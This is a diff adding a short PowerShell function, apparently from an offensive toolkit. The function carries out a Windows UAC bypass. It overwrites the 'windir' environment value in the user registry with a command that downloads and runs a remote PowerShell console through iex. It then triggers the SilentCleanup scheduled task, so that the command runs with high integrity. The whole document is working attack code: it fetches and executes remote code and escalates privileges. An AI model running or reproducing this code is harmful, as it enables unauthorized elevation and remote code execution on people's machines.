@@ -1,0 +1,26 @@
+function invoke-environmentinjection{
+  param(
+    [String] $instruction
+  )
+  
+  $path = 'hkcu:\environment'
+
+  #check if exist hkcu:\environment
+  $properties = Get-ItemProperty -Path $path -Name 'windir' -ErrorAction SilentlyContinue
+  if (-not($properties))
+  {
+    printMessage -message "Path doesn't exist"
+    printMessage -message "Creating path"
+  }
+  else
+  {
+    Remove-ItemProperty -Path $path -Name 'windir'
+  }
+
+    #Create windir injection
+    New-ItemProperty -Name 'windir' -Path 'hkcu:\environment' -Value "cmd /K c:\windows\system32\windowspowershell\v1.0\powershell.exe -C ""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console');console"" && REM "
+
+    #Task (high integrity)
+    schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+}
